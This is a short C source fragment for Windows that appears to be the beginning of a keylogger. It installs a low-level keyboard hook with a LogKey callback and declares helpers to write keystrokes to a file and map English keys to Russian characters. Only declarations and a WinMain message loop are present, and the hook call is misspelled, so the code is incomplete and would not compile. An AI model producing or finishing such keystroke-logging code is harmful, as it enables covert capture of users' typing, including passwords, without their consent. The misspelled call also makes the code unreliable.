#include <Windows.h>
#include <stdio.h>
#define RUS 1049
#define ENG 1033
#define SIZE_STR 20

BOOL IsCaps(void);
LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam);
VOID WriteToFile(LPWSTR wrst);
WCHAR EnToRus(WCHAR c);

int WINAPI WinMain()
{
	HHOOK hHook = SetWindowsHookexW(WH_KEYBOARD_LL, LogKey, NULL, NULL);
	MSG msg = { 0 };
	while (GetMessageW(&msg, NULL, 0, 0))
	{

	}
}